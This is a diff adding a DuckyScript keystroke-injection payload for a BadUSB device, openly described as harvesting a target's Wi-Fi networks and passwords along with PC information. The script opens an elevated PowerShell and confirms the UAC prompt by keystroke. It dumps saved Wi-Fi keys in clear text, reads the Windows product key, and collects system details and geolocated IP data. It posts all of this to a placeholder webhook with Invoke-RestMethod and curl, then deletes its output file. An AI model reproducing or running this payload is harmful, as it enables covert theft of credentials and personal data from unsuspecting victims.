@@ -1,0 +1,125 @@
+REM Author: adrn18
+REM Description: Gathers Targets PC info, iP Adress, Wi-Fi Networks/Passwords
+REM Version:   1.0
+REM Category: Passwords
+GUI D
+DELAY 100
+GUI r
+DELAY 1000
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
+ENTER
+DELAY 2000
+LEFT
+DELAY 50
+ENTER
+DELAY 1500
+STRING function Get-WindowsProductKey {
+ENTER
+STRING     $key = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform").BackupProductKeyDefault
+ENTER
+STRING     if ($key) {
+ENTER
+STRING         return $key
+ENTER
+STRING     } else {
+ENTER
+STRING         return "Could not retrieve the activation key."
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+STRING $wifiProfiles = netsh wlan show profiles
+ENTER
+STRING $wifiList = $wifiProfiles | Select-String "All User Profile"
+ENTER
+STRING $wifiInfo = "SSID/Networks          Passwords`n"
+ENTER
+STRING $wifiInfo += "--------------------- ----------------------------`n"
+ENTER
+STRING foreach ($wifi in $wifiList) {
+ENTER
+STRING     $ssid = $wifi -replace ".*: ", ""
+ENTER
+STRING     $password = netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content"
+ENTER
+STRING     $password = $password -replace ".*: ", ""
+ENTER
+STRING     if ($password -ne "") { 
+ENTER
+STRING         $wifiInfo += "{0,-20} {1,-28}`n" -f $ssid, $password 
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+STRING $txtFilePath = "$env:USERPROFILE\wifi_info.txt"
+ENTER
+STRING $wifiInfo | Out-File -FilePath $txtFilePath
+ENTER
+
+REM Send Wi-Fi credentials and ping @everyone
+STRING $wifiMessage = "@everyone Here are the Wi-Fi credentials:"
+ENTER
+STRING Invoke-RestMethod -Uri "YOUR_WEBHOOK_URL" -Method Post -Body (@{"content"=$wifiMessage} | ConvertTo-Json) -ContentType "application/json"
+ENTER
+STRING curl.exe -F "file=@$txtFilePath" "YOUR_WEBHOOK_URL"
+ENTER
+
+REM Collect System Info
+STRING $user = $env:USERNAME
+ENTER
+STRING $pcname = $env:COMPUTERNAME
+ENTER
+STRING $os = (Get-CimInstance Win32_OperatingSystem).Caption
+ENTER
+STRING $cpu = (Get-CimInstance Win32_Processor).Name
+ENTER
+STRING $gpu = (Get-CimInstance Win32_VideoController)[0].Name
+ENTER
+STRING $ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) + " GB"
+ENTER
+STRING $winKey = Get-WindowsProductKey
+ENTER
+STRING $data = Invoke-RestMethod -Uri "http://ipinfo.io/json"
+ENTER
+STRING $pcMessage = "@everyone Here is the Device Information:`n"
+ENTER
+STRING $pcMessage += "**System Information:**`n"
+ENTER
+STRING $pcMessage += "- **User:** $user`n"
+ENTER
+STRING $pcMessage += "- **PC Name:** $pcname`n"
+ENTER
+STRING $pcMessage += "- **OS:** $os`n"
+ENTER
+STRING $pcMessage += "- **CPU:** $cpu`n"
+ENTER
+STRING $pcMessage += "- **GPU:** $gpu`n"
+ENTER
+STRING $pcMessage += "- **RAM:** $ram`n"
+ENTER
+STRING $pcMessage += "- **Windows Activation Key:** $winKey`n"
+ENTER
+STRING $pcMessage += "`n**Public IP Information:**`n"
+ENTER
+STRING $pcMessage += "- **IP:** $($data.ip)`n"
+ENTER
+STRING $pcMessage += "- **City:** $($data.city)`n"
+ENTER
+STRING $pcMessage += "- **Region:** $($data.region)`n"
+ENTER
+STRING $pcMessage += "- **Country:** $($data.country)`n"
+ENTER
+STRING $pcMessage += "- **Time:** $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")`n"
+ENTER
+STRING $pcMessage += "- **Timezone:** $($data.timezone)`n"
+ENTER
+STRING Invoke-RestMethod -Uri "YOUR_WEBHOOK_URL" -Method Post -Body (@{"content"=$pcMessage} | ConvertTo-Json) -ContentType "application/json"
+ENTER
+DELAY 500
+STRING Remove-Item $txtFilePath
+ENTER
+DELAY 500
+STRING exit
+ENTER
